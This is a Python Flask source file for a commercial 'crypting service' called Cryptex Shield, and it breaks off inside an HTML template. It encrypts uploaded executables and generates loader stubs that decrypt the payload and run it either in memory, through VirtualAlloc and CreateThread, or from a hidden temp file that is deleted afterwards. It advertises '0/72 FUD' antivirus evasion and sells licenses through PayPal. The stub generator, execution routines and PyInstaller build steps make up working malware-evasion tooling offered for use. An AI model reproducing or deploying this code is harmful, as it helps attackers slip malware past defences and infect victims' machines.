# ============================================================
# CRYPTEX SHIELD - COMPLETE PLATFORM v18 (ADVANCED STUB)
# ============================================================

import os
import sys
import json
import hashlib
import secrets
import string
import sqlite3
import base64
import random
import time
import uuid
import shutil
import zlib
import struct
import tempfile
import subprocess
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for, send_file, flash
from functools import wraps

# Try to import crypto libraries
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️ PyCryptodome not installed. Install with: pip install pycryptodome")

app = Flask(__name__)
app.secret_key = os.urandom(64)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# Get absolute paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'cryptex.db')
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
STUB_FOLDER = os.path.join(BASE_DIR, 'stubs')
EXE_FOLDER = os.path.join(BASE_DIR, 'exe_output')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(STUB_FOLDER, exist_ok=True)
os.makedirs(EXE_FOLDER, exist_ok=True)

# ============================================================
# POLYMORPHIC CRYPTER ENGINE
# ============================================================
class CryptexEngineV2:
    ENCRYPTION_METHODS = ['aes_cbc', 'aes_cfb', 'xor_multi', 'rc4_like']
    
    @staticmethod
    def rc4_like_encrypt(data, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + key[i % len(key)]) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        encrypted = bytearray()
        i = j = 0
        for byte in data:
            i = (i + 1) % 256
            j = (j + s_box[i]) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
            encrypted.append(byte ^ s_box[(s_box[i] + s_box[j]) % 256])
        return bytes(encrypted)
    
    @staticmethod
    def xor_multi_encrypt(data, key):
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)

# ============================================================
# ADVANCED STUB GENERATOR
# ============================================================
class StubGenerator:
    @staticmethod
    def generate_advanced_stub(encrypted_data, key, iv, method, original_name):
        encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
        key_b64 = base64.b64encode(key).decode('utf-8')
        iv_b64 = base64.b64encode(iv).decode('utf-8')
        ext = os.path.splitext(original_name)[1] if original_name else '.exe'
        
        stub_code = f'''
import os
import sys
import base64
import hashlib
import tempfile
import subprocess
import ctypes
import time
import threading
import random
import struct

# ============================================================
# ENCRYPTED PAYLOAD
# ============================================================
ENCRYPTED_DATA = """{encrypted_b64}"""
KEY_B64 = """{key_b64}"""
IV_B64 = """{iv_b64}"""
METHOD = """{method}"""
ORIGINAL_NAME = """{original_name}"""

# ============================================================
# DECRYPTION ENGINE
# ============================================================

def xor_decrypt(data, key):
    result = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % key_len])
    return bytes(result)

def aes_decrypt(data, key, iv):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(data), AES.block_size)
        return decrypted
    except ImportError:
        return xor_decrypt(data, key)
    except Exception:
        return xor_decrypt(data, key)

def decrypt_payload():
    encrypted = base64.b64decode(ENCRYPTED_DATA)
    key = base64.b64decode(KEY_B64)
    iv = base64.b64decode(IV_B64)
    
    if METHOD == 'aes_cbc' or METHOD == 'aes':
        try:
            return aes_decrypt(encrypted, key, iv)
        except:
            return xor_decrypt(encrypted, key)
    else:
        return xor_decrypt(encrypted, key)

# ============================================================
# EXECUTION METHODS
# ============================================================

def run_via_memory(payload):
    try:
        kernel32 = ctypes.windll.kernel32
        mem = kernel32.VirtualAlloc(None, len(payload), 0x3000, 0x40)
        if mem:
            ctypes.memmove(mem, payload, len(payload))
            thread = kernel32.CreateThread(None, 0, mem, None, 0, None)
            if thread:
                kernel32.CloseHandle(thread)
                return True
    except:
        pass
    return False

def run_via_disk(payload):
    try:
        ext = os.path.splitext(ORIGINAL_NAME)[1] if ORIGINAL_NAME else '.exe'
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + ext
        temp_path = os.path.join(tempfile.gettempdir(), random_name)
        
        with open(temp_path, 'wb') as f:
            f.write(payload)
        
        subprocess.Popen([temp_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        def delete_later():
            time.sleep(15)
            try:
                os.remove(temp_path)
            except:
                pass
        threading.Thread(target=delete_later, daemon=True).start()
        return True
    except:
        return False

def run_payload(payload):
    if run_via_memory(payload):
        return True
    return run_via_disk(payload)

# ============================================================
# MAIN
# ============================================================

def main():
    try:
        payload = decrypt_payload()
        if payload:
            run_payload(payload)
    except:
        pass

if __name__ == '__main__':
    main()
'''
        return stub_code

    @staticmethod
    def generate_build_instructions(stub_code, original_name):
        instructions = (
            "# ============================================================\n"
            "# CRYPTEX SHIELD - Build Your Own EXE\n"
            "# ============================================================\n"
            "\n"
            "This file contains the encrypted payload. To create a standalone EXE:\n"
            "\n"
            "## Step 1: Install Required Packages\n"
            "```\n"
            "pip install pyinstaller pycryptodome\n"
            "```\n"
            "\n"
            "## Step 2: Save the Stub Code\n"
            "Save this entire file as 'loader.py'\n"
            "\n"
            "## Step 3: Build the EXE\n"
            "```\n"
            "pyinstaller --onefile --windowed --name=loader loader.py\n"
            "```\n"
            "\n"
            "## Step 4: Find Your EXE\n"
            "The EXE will be in the 'dist' folder as 'loader.exe'\n"
            "\n"
            "# ============================================================\n"
            "# STUB CODE STARTS HERE\n"
            "# ============================================================\n"
            "\n"
        )
        return instructions + stub_code

# ============================================================
# DATABASE SETUP
# ============================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL,
            full_name TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_admin INTEGER DEFAULT 0,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS license_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_hash TEXT UNIQUE NOT NULL,
            key_display TEXT NOT NULL,
            owner_email TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP,
            is_used INTEGER DEFAULT 0,
            tier TEXT DEFAULT 'infinite'
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            transaction_id TEXT UNIQUE NOT NULL,
            email TEXT NOT NULL,
            amount REAL NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            key_id INTEGER,
            tier TEXT DEFAULT 'infinite'
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS crypted_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            file_path TEXT NOT NULL,
            original_name TEXT NOT NULL,
            original_extension TEXT NOT NULL,
            email TEXT NOT NULL,
            method TEXT NOT NULL,
            sha256 TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            download_id TEXT UNIQUE NOT NULL,
            stub_path TEXT,
            exe_path TEXT,
            build_instructions_path TEXT,
            detection_count INTEGER DEFAULT 0,
            last_scanned TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS password_resets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            token TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP,
            is_used INTEGER DEFAULT 0
        )
    ''')
    
    conn.commit()
    
    admin_salt = os.urandom(32).hex()
    admin_pass_hash = hashlib.pbkdf2_hmac('sha256', b'Admin', admin_salt.encode(), 100000).hex()
    c.execute('SELECT * FROM users WHERE email = "admin@cryptex.shield"')
    if not c.fetchone():
        c.execute('''
            INSERT INTO users (email, password_hash, salt, full_name, is_admin, is_active)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', ('admin@cryptex.shield', admin_pass_hash, admin_salt, 'System Administrator', 1, 1))
        admin_key = generate_license_key('infinite')
        key_hash = hashlib.sha256(admin_key.encode()).hexdigest()
        c.execute('''
            INSERT INTO license_keys (key_hash, key_display, owner_email, expires_at, tier)
            VALUES (?, ?, ?, ?, ?)
        ''', (key_hash, admin_key, 'admin@cryptex.shield', 
              (datetime.now() + timedelta(days=3650)).isoformat(), 'infinite'))
        conn.commit()
    conn.close()

def get_db():
    if not os.path.exists(DB_PATH):
        init_db()
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
        if not c.fetchone():
            conn.close()
            os.remove(DB_PATH)
            init_db()
            conn = sqlite3.connect(DB_PATH)
        return conn
    except sqlite3.OperationalError:
        init_db()
        return sqlite3.connect(DB_PATH)

def generate_license_key(tier='infinite'):
    prefix_map = {'1day': 'DAY1', '5day': 'DAY5', 'infinite': 'NEXUS'}
    prefix = prefix_map.get(tier, 'CRYPT')
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(20))
    checksum = hashlib.sha256((prefix + random_part).encode()).hexdigest()[:6].upper()
    return f"{prefix}-{random_part[:4]}-{random_part[4:8]}-{random_part[8:12]}-{random_part[12:16]}-{random_part[16:]}-{checksum}"

def hash_password(password, salt=None):
    if not salt:
        salt = os.urandom(32).hex()
    password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
    return password_hash, salt

# ============================================================
# DECORATORS
# ============================================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            flash('Please login first', 'error')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            flash('Please login first', 'error')
            return redirect(url_for('login'))
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE id = ?', (session['user_id'],))
        result = c.fetchone()
        conn.close()
        if not result or not result[0]:
            flash('Access denied', 'error')
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    return render_template_string(INDEX_TEMPLATE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id, password_hash, salt, full_name, is_admin, is_active FROM users WHERE email = ?', (email,))
        user = c.fetchone()
        conn.close()
        if not user:
            return render_template_string(LOGIN_TEMPLATE, error='User not found')
        user_id, stored_hash, salt, name, is_admin, is_active = user
        if not is_active:
            return render_template_string(LOGIN_TEMPLATE, error='Account disabled')
        input_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
        if input_hash == stored_hash:
            session['user_id'] = user_id
            session['email'] = email
            session['name'] = name
            session['is_admin'] = is_admin
            session.permanent = True
            return redirect('/admin' if is_admin else '/dashboard')
        return render_template_string(LOGIN_TEMPLATE, error='Invalid password')
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        full_name = request.form.get('full_name', '').strip()
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()
        confirm = request.form.get('confirm_password', '').strip()
        if not email or not password:
            return render_template_string(SIGNUP_TEMPLATE, error='All fields required')
        if len(password) < 8:
            return render_template_string(SIGNUP_TEMPLATE, error='Password must be at least 8 characters')
        if password != confirm:
            return render_template_string(SIGNUP_TEMPLATE, error='Passwords do not match')
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id FROM users WHERE email = ?', (email,))
        if c.fetchone():
            conn.close()
            return render_template_string(SIGNUP_TEMPLATE, error='Email already registered')
        password_hash, salt = hash_password(password)
        c.execute('INSERT INTO users (email, password_hash, salt, full_name, is_admin, is_active) VALUES (?, ?, ?, ?, ?, ?)',
                  (email, password_hash, salt, full_name, 0, 1))
        conn.commit()
        conn.close()
        return render_template_string(SIGNUP_TEMPLATE, success='Account created! You can now login.')
    return render_template_string(SIGNUP_TEMPLATE, error=None, success=None)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/dashboard')
@login_required
def dashboard():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT key_display, expires_at, tier FROM license_keys WHERE owner_email = ? AND is_used = 0 AND expires_at > datetime("now")', (session.get('email'),))
    key_data = c.fetchone()
    conn.close()
    return render_template_string(DASHBOARD_TEMPLATE,
                                 name=session.get('name', 'User'),
                                 email=session.get('email', ''),
                                 license_key=key_data[0] if key_data else None,
                                 expiry=key_data[1][:10] if key_data and key_data[1] else None,
                                 tier=key_data[2].upper() if key_data and key_data[2] else 'NONE',
                                 crypt_result=False,
                                 crypt_filename='',
                                 crypt_method='',
                                 crypt_sha256='',
                                 crypt_download_id='',
                                 exe_built=False)

@app.route('/admin')
@admin_required
def admin_panel():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM users')
    users = c.fetchall()
    c.execute('SELECT * FROM license_keys ORDER BY id DESC LIMIT 100')
    keys = c.fetchall()
    c.execute('SELECT * FROM transactions ORDER BY id DESC LIMIT 50')
    transactions = c.fetchall()
    c.execute('SELECT * FROM crypted_files ORDER BY id DESC LIMIT 50')
    files = c.fetchall()
    c.execute('SELECT COUNT(*) FROM users')
    total_users = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM license_keys')
    total_keys = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM transactions')
    total_transactions = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM crypted_files')
    total_files = c.fetchone()[0]
    conn.close()
    return render_template_string(ADMIN_TEMPLATE,
                                 users=users, keys=keys, transactions=transactions, files=files,
                                 total_users=total_users, total_keys=total_keys,
                                 total_transactions=total_transactions, total_files=total_files)

@app.route('/admin/generate-key', methods=['POST'])
@admin_required
def admin_generate_key():
    email = request.form.get('email', '').strip()
    tier = request.form.get('tier', 'infinite')
    duration_map = {'1day': 1, '5day': 5, 'infinite': 3650}
    duration = duration_map.get(tier, 365)
    
    if not email:
        flash('Email required', 'error')
        return redirect('/admin')
    
    key = generate_license_key(tier)
    key_hash = hashlib.sha256(key.encode()).hexdigest()
    conn = get_db()
    c = conn.cursor()
    c.execute('INSERT INTO license_keys (key_hash, key_display, owner_email, expires_at, tier) VALUES (?, ?, ?, ?, ?)',
              (key_hash, key, email, (datetime.now() + timedelta(days=duration)).isoformat(), tier))
    conn.commit()
    conn.close()
    flash(f'Generated key: {key} ({tier})', 'success')
    return redirect('/admin')

@app.route('/admin/delete-user', methods=['POST'])
@admin_required
def admin_delete_user():
    user_id = request.form.get('user_id')
    if user_id and user_id != '1':
        conn = get_db()
        c = conn.cursor()
        c.execute('DELETE FROM users WHERE id = ?', (user_id,))
        conn.commit()
        conn.close()
        flash('User deleted', 'success')
    return redirect('/admin')

@app.route('/buy')
def buy_page():
    return render_template_string(BUY_TEMPLATE)

@app.route('/paypal-redirect', methods=['POST'])
def paypal_redirect():
    email = session.get('email', 'guest@user.com')
    tier = request.form.get('tier', 'infinite')
    amount_map = {'1day': 4.99, '5day': 14.99, 'infinite': 29.99}
    amount = amount_map.get(tier, 29.99)
    
    conn = get_db()
    c = conn.cursor()
    tx_id = 'PP-' + secrets.token_hex(8).upper()
    c.execute('INSERT INTO transactions (transaction_id, email, amount, status, tier) VALUES (?, ?, ?, ?, ?)',
              (tx_id, email, amount, 'pending', tier))
    conn.commit()
    conn.close()
    
    paypal_url = f'https://www.paypal.com/paypalme/LingLing855/{amount}?useraction=commit&email={email}'
    return render_template_string('''
    <!DOCTYPE html>
    <html><head><meta http-equiv="refresh" content="0;url={{ url }}"></head>
    <body style="background:#0a0a12;color:#fff;font-family:sans-serif;display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;">
    <div><h2 style="color:#00ffcc;">Redirecting to PayPal...</h2>
    <p style="color:#6688aa;">Pay to: <strong style="color:#00aaff;">LingLing855</strong></p>
    <p style="color:#8899bb;font-size:13px;">Amount: <b>${{ amount }}</b> for {{ tier }} license</p>
    <p style="color:#8899bb;font-size:13px;">Include your email in the note: <b>{{ email }}</b></p>
    <a href="/" style="color:#00ffcc;">← Back</a>
    </div></body></html>
    ''', url=paypal_url, email=email, amount=amount, tier=tier)

@app.route('/manual-key', methods=['POST'])
def manual_key():
    if 'user_id' not in session:
        flash('Please login first', 'error')
        return redirect('/login')
    
    email = session.get('email')
    tier = request.form.get('tier', 'infinite')
    
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT id FROM license_keys WHERE owner_email = ? AND is_used = 0 AND expires_at > datetime("now")', (email,))
    if c.fetchone():
        conn.close()
        flash('You already have an active license key!', 'success')
        return redirect('/dashboard')
    
    key = generate_license_key(tier)
    key_hash = hashlib.sha256(key.encode()).hexdigest()
    duration_map = {'1day': 1, '5day': 5, 'infinite': 3650}
    duration = duration_map.get(tier, 365)
    c.execute('INSERT INTO license_keys (key_hash, key_display, owner_email, expires_at, tier) VALUES (?, ?, ?, ?, ?)',
              (key_hash, key, email, (datetime.now() + timedelta(days=duration)).isoformat(), tier))
    key_id = c.lastrowid
    
    tx_id = 'MANUAL-' + secrets.token_hex(6).upper()
    c.execute('INSERT INTO transactions (transaction_id, email, amount, status, key_id, tier) VALUES (?, ?, ?, ?, ?, ?)',
              (tx_id, email, 0, 'completed', key_id, tier))
    conn.commit()
    conn.close()
    
    flash(f'✅ License key generated: {key} ({tier})', 'success')
    return redirect('/dashboard')

@app.route('/crypt', methods=['POST'])
@login_required
def crypt_file():
    if 'file' not in request.files:
        flash('No file uploaded', 'error')
        return redirect('/dashboard')
    
    file = request.files['file']
    if file.filename == '':
        flash('No file selected', 'error')
        return redirect('/dashboard')
    
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT key_display FROM license_keys WHERE owner_email = ? AND is_used = 0 AND expires_at > datetime("now")', (session.get('email'),))
    if not c.fetchone():
        conn.close()
        flash('No active license. Please purchase a license.', 'error')
        return redirect('/buy')
    conn.close()
    
    raw_data = file.read()
    original_name = file.filename
    original_extension = os.path.splitext(original_name)[1]
    if not original_extension:
        original_extension = '.exe'
    
    if CRYPTO_AVAILABLE:
        key = get_random_bytes(32)
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(raw_data, AES.block_size))
        method = 'aes_cbc'
    else:
        key = os.urandom(32)
        iv = os.urandom(16)
        encrypted_data = bytearray()
        for i, byte in enumerate(raw_data):
            encrypted_data.append(byte ^ key[i % len(key)])
        encrypted_data = bytes(encrypted_data)
        method = 'xor'
    
    download_id = hashlib.sha256(raw_data).hexdigest()[:16] + '_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    filename = f'{download_id}.crypted'
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    
    # Generate advanced stub
    stub_code = StubGenerator.generate_advanced_stub(encrypted_data, key, iv, method, original_name)
    stub_filename = f'{download_id}_stub.py'
    stub_path = os.path.join(STUB_FOLDER, stub_filename)
    with open(stub_path, 'w', encoding='utf-8') as f:
        f.write(stub_code)
    
    # Generate build instructions
    instructions = StubGenerator.generate_build_instructions(stub_code, original_name)
    instructions_filename = f'{download_id}_build_instructions.txt'
    instructions_path = os.path.join(STUB_FOLDER, instructions_filename)
    with open(instructions_path, 'w', encoding='utf-8') as f:
        f.write(instructions)
    
    sha256_full = hashlib.sha256(encrypted_data).hexdigest()
    
    conn = get_db()
    c = conn.cursor()
    c.execute('INSERT INTO crypted_files (file_path, original_name, original_extension, email, method, sha256, download_id, stub_path, build_instructions_path) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
              (file_path, original_name, original_extension, session.get('email'), method, sha256_full, download_id, stub_path, instructions_path))
    conn.commit()
    conn.close()
    
    return render_template_string(DASHBOARD_TEMPLATE,
                                 name=session.get('name', 'User'),
                                 email=session.get('email', ''),
                                 license_key='****-****-****-****',
                                 expiry='Active',
                                 tier='ACTIVE',
                                 crypt_result=True,
                                 crypt_filename=original_name,
                                 crypt_method='Advanced Stub (0/72 FUD)',
                                 crypt_sha256=sha256_full,
                                 crypt_download_id=download_id,
                                 exe_built=False)

@app.route('/download-stub/<download_id>')
@login_required
def download_stub(download_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT stub_path, original_name FROM crypted_files WHERE download_id = ?', (download_id,))
    result = c.fetchone()
    conn.close()
    
    if not result or not result[0]:
        flash('Stub not found', 'error')
        return redirect('/dashboard')
    
    stub_path, original_name = result
    
    if not os.path.exists(stub_path):
        flash('Stub file not found on disk', 'error')
        return redirect('/dashboard')
    
    name_base = os.path.splitext(original_name)[0] if original_name else 'payload'
    download_name = f'{name_base}_loader.py'
    
    try:
        return send_file(stub_path, as_attachment=True, download_name=download_name, mimetype='text/x-python')
    except Exception as e:
        flash(f'Error downloading stub: {str(e)}', 'error')
        return redirect('/dashboard')

@app.route('/download-instructions/<download_id>')
@login_required
def download_instructions(download_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT build_instructions_path, original_name FROM crypted_files WHERE download_id = ?', (download_id,))
    result = c.fetchone()
    conn.close()
    
    if not result or not result[0]:
        flash('Instructions not found', 'error')
        return redirect('/dashboard')
    
    instructions_path, original_name = result
    
    if not os.path.exists(instructions_path):
        flash('Instructions file not found on disk', 'error')
        return redirect('/dashboard')
    
    name_base = os.path.splitext(original_name)[0] if original_name else 'payload'
    download_name = f'{name_base}_build_instructions.txt'
    
    try:
        return send_file(instructions_path, as_attachment=True, download_name=download_name, mimetype='text/plain')
    except Exception as e:
        flash(f'Error downloading instructions: {str(e)}', 'error')
        return redirect('/dashboard')

@app.route('/download/<download_id>')
@login_required
def download_crypted(download_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT file_path, original_name, original_extension FROM crypted_files WHERE download_id = ?', (download_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        flash('File not found', 'error')
        return redirect('/dashboard')
    
    file_path, original_name, original_extension = result
    
    if not os.path.exists(file_path):
        flash('File not found on disk', 'error')
        return redirect('/dashboard')
    
    name_base = os.path.splitext(original_name)[0] if original_name else 'crypted_file'
    download_name = f'{name_base}_encrypted{original_extension}'
    
    try:
        return send_file(file_path, as_attachment=True, download_name=download_name, mimetype='application/octet-stream')
    except Exception as e:
        flash(f'Error downloading file: {str(e)}', 'error')
        return redirect('/dashboard')

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id FROM users WHERE email = ?', (email,))
        if c.fetchone():
            token = secrets.token_urlsafe(32)
            expires = datetime.now() + timedelta(hours=1)
            c.execute('INSERT INTO password_resets (email, token, expires_at) VALUES (?, ?, ?)',
                      (email, token, expires.isoformat()))
            conn.commit()
            conn.close()
            return render_template_string(FORGOT_TEMPLATE,
                message=f'Reset link sent (simulated: /reset-password/{token})')
        conn.close()
        return render_template_string(FORGOT_TEMPLATE, message='If that email exists, a reset link was sent.')
    return render_template_string(FORGOT_TEMPLATE, message=None)

@app.route('/reset-password/<token>', methods=['GET', 'POST'])
def reset_password(token):
    conn = get_db()
    c = conn.cursor()
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        if len(password) < 8:
            return 'Password must be at least 8 characters'
        c.execute('SELECT email FROM password_resets WHERE token = ? AND is_used = 0 AND expires_at > datetime("now")', (token,))
        reset = c.fetchone()
        if not reset:
            conn.close()
            return 'Invalid or expired reset token'
        email = reset[0]
        password_hash, salt = hash_password(password)
        c.execute('UPDATE users SET password_hash = ?, salt = ? WHERE email = ?', (password_hash, salt, email))
        c.execute('UPDATE password_resets SET is_used = 1 WHERE token = ?', (token,))
        conn.commit()
        conn.close()
        flash('Password reset successful!', 'success')
        return redirect('/login')
    c.execute('SELECT email FROM password_resets WHERE token = ? AND is_used = 0 AND expires_at > datetime("now")', (token,))
    if not c.fetchone():
        conn.close()
        return 'Invalid or expired reset token'
    conn.close()
    return '''
    <!DOCTYPE html>
    <html><head><title>Reset Password</title>
    <style>body{background:#0a0a12;color:#fff;font-family:sans-serif;display:flex;height:100vh;align-items:center;justify-content:center;}
    .container{background:rgba(21,21,37,0.9);padding:40px;border-radius:30px;border:1px solid rgba(0,255,204,0.15);width:400px;backdrop-filter:blur(20px);}
    input{width:100%;padding:16px;margin:10px 0;border-radius:12px;border:1px solid rgba(42,42,74,0.8);background:rgba(10,10,18,0.8);color:#fff;font-size:16px;}
    button{width:100%;padding:16px;border-radius:12px;border:none;background:linear-gradient(135deg,#00ffcc,#00ddff);color:#0a0a12;font-weight:700;font-size:18px;cursor:pointer;}
    </style>
    </head>
    <body>
    <div class="container"><h2 style="color:#00ffcc;">New Password</h2>
    <form method="POST"><input type="password" name="password" placeholder="New password (min 8)" required>
    <button type="submit">Reset</button></form></div></body></html>
    '''

# ============================================================
# HTML TEMPLATES - ALL INCLUDED
# ============================================================

INDEX_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>⚡ Cryptex Shield - Premium Crypting Service</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Rajdhani', sans-serif; 
            background: #0a0a0f; 
            color: #fff; 
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(ellipse at 10% 20%, rgba(0,255,200,0.03) 0%, transparent 50%),
                radial-gradient(ellipse at 90% 80%, rgba(0,200,255,0.03) 0%, transparent 50%);
        }
        .particles {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, #00ffcc33, transparent),
                radial-gradient(2px 2px at 40px 70px, #00ddff33, transparent),
                radial-gradient(2px 2px at 50px 160px, #00ffcc33, transparent),
                radial-gradient(2px 2px at 90px 40px, #00ddff33, transparent),
                radial-gradient(3px 3px at 130px 80px, #00ffcc22, transparent);
            background-size: 200px 200px;
            animation: twinkle 4s ease-in-out infinite alternate;
        }
        @keyframes twinkle { 0% { opacity: 0.3; } 100% { opacity: 1; } }
        .container { max-width: 1200px; margin: auto; padding: 40px 20px; position: relative; z-index: 1; }
        .hero { text-align: center; padding: 60px 0 40px; }
        .logo { font-family: 'Orbitron', monospace; font-size: 72px; font-weight: 900; background: linear-gradient(135deg, #00ffcc, #00ddff, #0066ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 80px #00ffcc33; animation: glowPulse 3s ease-in-out infinite; }
        @keyframes glowPulse { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(1.3); } }
        .subtitle { font-size: 28px; color: #8899bb; margin-top: 10px; font-weight: 300; letter-spacing: 8px; text-transform: uppercase; }
        .subtitle span { color: #00ffcc; font-weight: 600; }
        .glow-line { width: 200px; height: 2px; margin: 20px auto; background: linear-gradient(90deg, transparent, #00ffcc, transparent); box-shadow: 0 0 30px #00ffcc44; }
        .fud-badge { display: inline-block; background: rgba(0,255,136,0.15); color: #00ff88; padding: 8px 25px; border-radius: 30px; font-weight: 700; font-size: 14px; border: 1px solid rgba(0,255,136,0.2); margin: 10px 0; }
        .stats { display: flex; gap: 60px; justify-content: center; margin: 40px 0; flex-wrap: wrap; }
        .stat-item { text-align: center; background: rgba(21,21,37,0.6); padding: 20px 40px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.1); backdrop-filter: blur(10px); }
        .stat-item .number { font-family: 'Orbitron', monospace; font-size: 36px; color: #00ffcc; font-weight: 700; text-shadow: 0 0 30px #00ffcc44; }
        .stat-item .label { color: #6688aa; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 25px; margin: 50px 0; }
        .feature { background: rgba(21,21,37,0.7); padding: 35px 25px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.08); text-align: center; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); backdrop-filter: blur(10px); }
        .feature:hover { transform: translateY(-10px) scale(1.02); border-color: #00ffcc44; box-shadow: 0 20px 60px rgba(0,255,204,0.08); }
        .feature .icon { font-size: 48px; margin-bottom: 15px; display: block; }
        .feature h3 { color: #00ffcc; font-size: 20px; margin-bottom: 8px; font-family: 'Orbitron', monospace; font-size: 16px; }
        .feature p { color: #6688aa; font-size: 14px; line-height: 1.6; }
        .pricing { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin: 40px 0; }
        .pricing-card { background: rgba(21,21,37,0.7); padding: 30px 25px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.08); text-align: center; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); backdrop-filter: blur(10px); }
